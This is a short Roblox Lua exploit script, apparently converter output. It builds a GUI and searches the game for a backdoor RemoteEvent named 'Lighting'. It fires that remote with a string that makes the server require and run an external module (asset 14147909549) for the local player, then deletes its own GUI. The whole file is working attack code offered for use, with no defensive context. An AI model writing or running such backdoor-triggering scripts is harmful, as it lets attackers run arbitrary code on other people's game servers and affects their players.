-- Instances:

local ScreenGui = Instance.new("ScreenGui")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Scripts:

local function WTBITG_fake_script() -- ScreenGui.LocalScript 
    local script = Instance.new('LocalScript', ScreenGui)

    for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name == "Lighting" then
            v:FireServer("require(14147909549).load(".."'"..game.Players.LocalPlayer.Name.."'"..")", "Lightsource1", "Lightsource2")
        end
    end
    script.Parent:Destroy()
end
coroutine.wrap(WTBITG_fake_script)()
